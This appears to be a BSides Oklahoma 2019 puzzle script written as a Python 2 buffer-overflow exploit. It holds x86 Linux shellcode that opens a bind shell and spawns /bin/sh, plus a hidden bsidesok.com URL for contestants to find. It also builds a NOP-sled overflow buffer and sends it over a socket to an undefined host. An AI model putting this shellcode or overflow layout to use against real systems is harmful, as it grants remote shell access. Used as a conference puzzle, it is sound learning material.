#!/usr/bin/python
import socket
import sys

print '[*] BSides Oklahoma 2019 - Remote Conference Execution'
print '[*] AKA BSidesOK V - THE FIFTH ONE - April 12, 2019'
print '[*] INTERWEBZ :: https://www.bsidesok.com'
print '[*] TWITTERZ :: @BSidesOK'

shellcode  = '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01'
shellcode += '\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0'
shellcode += '\xb0\x66\xb3\x02\x52\x66\x68\x20\xfc\x66\x53\x89'
shellcode += '\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3'
shellcode += '\x04\x52\x57\x89\xe1\xcd\x80\x31\xc0\x50\xb0\x66'
shellcode += '\x31\xdb\x53\x57\xb3\x05\x89\xe1\xcd\x80\x89\xc2'
shellcode += '\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\x89\xd3'
shellcode += '\x41\xcd\x80\xb0\x3f\x89\xd3\x41\xcd\x80\x31\xc0'
shellcode += '\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89'
shellcode += '\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\x50'
shellcode += '\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3'
shellcode += '\x50\x68\x2e\x70\x6e\x67\x68\x74\x64\x6f\x67\x68'
shellcode += '\x64\x5f\x68\x6f\x68\x74\x5f\x61\x6e\x68\x65\x68'
shellcode += '\x65\x61\x68\x2f\x70\x75\x72\x68\x2e\x63\x6f\x6d'
shellcode += '\x68\x65\x73\x6f\x6b\x68\x62\x73\x69\x64\x68\x77'
shellcode += '\x77\x77\x2e\x68\x73\x3a\x2f\x2f\x68\x68\x74\x74'
shellcode += '\x70\x89\xe6\x50\x56\x53\x89\xe1\x50\x89\xe2\xb0'
shellcode += '\x0b\xcd\x80\xc3'



print '[!] Find the hidden code in the shellcode (front)...'
print '[!] And tweet it to us...it helps to read the fine print'

retaddress = "\x89\x35\x3d\x21"
buffer = "BSidesOK" * 2019 + retaddress + "\x90" * 16 + shellcode 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((server, port))
sock.send(buffer)
sock.close()
